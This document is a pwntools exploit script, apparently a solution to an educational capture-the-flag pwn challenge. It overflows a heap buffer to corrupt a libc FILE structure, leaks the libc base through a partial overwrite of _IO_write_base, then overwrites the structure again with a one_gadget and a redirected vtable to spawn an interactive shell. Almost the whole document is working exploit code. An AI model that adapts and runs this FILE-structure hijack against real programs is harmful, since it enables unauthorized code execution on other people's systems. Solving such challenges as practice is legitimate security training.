#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'amd64'

if args['R']:
    r = remote('edu-ctf.zoolab.org', 30218)
else:
    r = process('./chal')

libc = ELF('./libc.so.6')

# p {struct _IO_FILE_plus} addr

r.sendlineafter('> ', '1')

# set file_no to 1 for output
r.sendlineafter('> ', '2')
flags = 0xfbad0800
payload = flat(
    flags, 0,
    0, 0,
    0, 0, 
    0, 0, 
    0, 0, 
    0, 0,
    0, 0,
    1
)
r.sendlineafter('data> ', b'A'*0x208 + p64(0x1e1) + payload)
r.sendlineafter('> ', '3')

# get libc base address
r.sendlineafter('> ', '2')
flags = 0xfbad1800
payload = flat(
    flags, 0,
    0, 0,
)
# partial overwrite the last two bytes of _IO_write_base
r.sendlineafter('data> ', b'A'*0x208 + p64(0x1e1) + payload)
r.sendlineafter('> ', '3')

# for remote
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '3')
r.sendlineafter('> ', '3')

libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['_IO_wfile_jumps']
print(f'libc_base: {hex(libc_base)}')


_IO_file_jumps = libc_base + libc.sym['_IO_file_jumps']
one_gadget = libc_base + 0xe6c7e # r15==NULL and r12==NULL
system = libc_base + libc.sym['system']
print(hex(system))
print(hex(one_gadget))

r.sendlineafter('> ', '2')
flags = 0xfbad0800
# flags = b'/bin/sh\x00'
payload = flat(
    flags, 0,
    _IO_file_jumps, 0,
    _IO_file_jumps, _IO_file_jumps + 0x18, 
    _IO_file_jumps + 0x20, 0, 
    0, 0, 
    0, 0,
    0, 0,
    1
)
r.sendlineafter('data> ', p64(one_gadget) + p64(0) + b'A'*0x1f8 + p64(0x1e0) + payload)
# r.sendlineafter('data> ', b'/bin/sh\x00' + p64(system)  + b'A'*0x1f8 + p64(0x1e0) + payload)
# gdb.attach(r)

r.sendlineafter('> ', '3')
r.interactive()